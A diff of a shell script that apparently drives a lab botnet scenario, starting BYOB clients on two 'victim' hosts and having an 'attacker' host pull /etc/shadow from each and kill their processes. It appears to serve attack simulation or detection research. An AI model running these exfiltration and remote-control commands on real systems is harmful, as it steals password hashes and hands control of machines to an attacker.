@@ -13,22 +13,30 @@ attackerPid=$1
 
 sleep 10 # let the server boot
 
-ssh compromised "byob-client" &
-compromisedPid=$!
+ssh victim1 "byob-client" &
+victimPid=$!
+
+ssh victim2 "byob-client" &
+victimPid=$!
 
 
 sleep 5 # let the victim connect
 
 
-ssh attacker "byossh -t 10 compromised portscanner 10.10.10.3 >> /tmp/port-results && cat /tmp/port-results"
+ssh attacker "byossh -t 10 victim1 upload /etc/shadow"
 
 sleep 2
 
-ssh attacker "byossh -t 10 compromised portscanner 10.10.10.4 >> /tmp/port-results && cat /tmp/port-results"
+ssh attacker "byossh -t 10 victim2 upload /etc/shadow"
+
+sleep 2
 
 # Kill byob on client via byob
-ssh attacker "byossh compromised sudo kill \$(ps -e | grep python | awk '{print \$1}')"
-ssh attacker "byossh compromised sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
+ssh attacker "byossh victim1 sudo kill \$(ps -e | grep python | awk '{print \$1}')"
+ssh attacker "byossh victim1 sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
+
+ssh attacker "byossh victim2 sudo kill \$(ps -e | grep python | awk '{print \$1}')"
+ssh attacker "byossh victim2 sudo kill \$(ps -e | grep byob | awk '{print \$1}')"
 
 # Kill byob server on attacker
 remote_kill attacker server
